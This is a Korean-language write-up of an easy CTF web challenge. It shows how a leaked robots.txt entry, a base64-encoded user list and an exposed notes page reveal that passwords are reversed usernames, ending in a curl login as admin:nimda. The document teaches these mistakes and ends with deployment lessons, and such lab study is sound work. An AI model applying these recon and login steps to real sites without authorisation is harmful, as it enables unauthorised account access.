---
ctf_name: "BroncoCTF"
challenge_name: "Lovely Login"
category: "web"
difficulty: "easy"
author: "oscarjhk"
date: "2026-07-12"
points: 10
tags: [robots.txt, information-disclosure, base64, weak-authentication]
---

# Lovely Login

## 문제 설명

> Welcome to our lovely new login page 💕. The developers swear it’s secure… but they may have forgotten to clean up a few things before launch. Can you figure out how authentication works and log in as the right user? P.S. please follow my wishes and do not scrape it...

- 문제 URL: `https://broncoctf-lovely-login.chals.io/`

## 풀이

### 분석

첫 화면은 단순한 로그인 페이지이다. 클라이언트 코드를 보면 입력한 `username`, `password`를 JSON으로 만들어 `/login`에 `POST` 요청하는 구조였다.

```javascript
const res = await fetch("/login", {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  body: JSON.stringify({username: u, password: p})
});
```

문제 설명의 `do not scrape it` 문구가 눈에 띄었다. 무작위 디렉터리 브루트포싱을 하지 말라는 의미로 보고, 먼저 웹 사이트가 명시적으로 공개하는 표준 파일인 `robots.txt`를 확인했다.

```http
GET /robots.txt HTTP/1.1
Host: broncoctf-lovely-login.chals.io
```

응답은 다음과 같았다.

```text
User-agent: *
Disallow: /security

# amVmZixzYXJhaCx hZG1pbixndWVzdA==
```

여기서 두 가지 단서를 얻을 수 있다.

1. `/security` 경로가 존재한다.
2. 주석에 base64처럼 보이는 문자열이 남아 있다.

주석의 문자열은 중간에 공백이 있지만, 공백을 제거하고 디코딩하면 사용자 목록이 나온다.

```python
import base64

encoded = "amVmZixzYXJhaCx hZG1pbixndWVzdA=="
print(base64.b64decode(encoded.replace(" ", "")).decode())
```

실행 결과는 다음과 같다.

```text
jeff,sarah,admin,guest
```

이후 `robots.txt`에서 확인한 `/security`에 접근했다.

```http
GET /security HTTP/1.1
Host: broncoctf-lovely-login.chals.io
```

응답에는 내부 보안 메모가 그대로 노출되어 있었다.

```text
Internal Security Notes
Status: Work in progress

Passwords are derived from usernames
Current implementation stores them backwards for obfuscation
Planned upgrade: hashing + salting
TODO: remove this page before production deployment!
```

즉 비밀번호는 사용자 이름에서 파생되며, 현재 구현은 이를 거꾸로 저장한다. 사용자 목록에 `admin`이 있으므로 관리자 계정의 비밀번호는 `admin`을 뒤집은 `nimda`라고 추론할 수 있다.

### 취약점

이 문제의 핵심 취약점은 공개되어서는 안 되는 인증 관련 정보가 여러 위치에 남아 있었다는 점이다.

- `robots.txt`에 내부 경로인 `/security`가 노출되어 있었다.
- `robots.txt` 주석에 base64로 인코딩된 사용자 목록이 남아 있었다.
- `/security` 페이지에 비밀번호 생성 규칙이 그대로 공개되어 있었다.
- 비밀번호가 `username[::-1]` 형태라서 추측이 매우 쉽다.

`robots.txt`는 접근 제어가 아니라 크롤러에게 수집 제외 경로를 알려주는 파일이다. 따라서 민감한 경로나 계정 관련 단서를 여기에 적으면 공격자에게 직접적인 힌트가 된다.

### 익스플로잇

전체 풀이 흐름은 다음과 같다.

1. `/robots.txt`에서 `/security` 경로와 base64 문자열을 확인한다.
2. base64 문자열을 디코딩해 `jeff,sarah,admin,guest` 사용자 목록을 얻는다.
3. `/security`에서 비밀번호가 사용자명을 뒤집은 값임을 확인한다.
4. `admin`의 비밀번호를 `nimda`로 계산한다.
5. `/login`에 `admin:nimda`로 로그인한다.

로그인 요청은 다음과 같이 보낼 수 있다.

```bash
curl -sS -X POST https://broncoctf-lovely-login.chals.io/login \
  -H 'Content-Type: application/json' \
  --data '{"username":"admin","password":"nimda"}'
```

성공하면 관리자 환영 메시지와 함께 플래그가 출력된다.

```html
<h2>Welcome, admin.</h2>
<pre>bronco{...}</pre>
```

## 플래그

```text
bronco{REDACTED}
```

## 배운 점

이번 문제는 숨겨진 페이지를 무작정 스캔하는 문제가 아니라, 공개된 파일에 남은 운영 실수들을 순서대로 읽어내는 문제였다.

`robots.txt`는 보안 기능이 아니며, base64 인코딩도 암호화가 아니다. 또한 비밀번호를 단순히 뒤집는 방식은 인증 정보 보호에 아무런 실질적 효과가 없다. 출시 전 디버그 페이지, 내부 메모, 임시 주석을 제거하는 기본적인 배포 점검이 중요하다는 점을 보여준다.
